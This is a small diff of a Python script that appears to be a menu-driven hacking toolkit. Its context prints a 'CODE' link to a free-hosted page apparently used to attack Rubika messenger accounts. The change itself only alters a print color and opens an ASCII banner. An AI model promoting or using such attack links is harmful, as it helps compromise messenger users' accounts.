@@ -220,7 +220,7 @@ if up == "14":
   print ('            CODE:>>>>>>' + '%s%s http://dxprit-supportbot-hacker-bakhtiari-fil.phpnet.us/fil.rubika.html?i=1  %s' % (fg('red'), bg('black'), attr('reset')))
 
 
-print (Fore.BLUE + "")
+print (Fore.GREEN + "")
 x = """
 
                                              XXKOxcxkOXX,
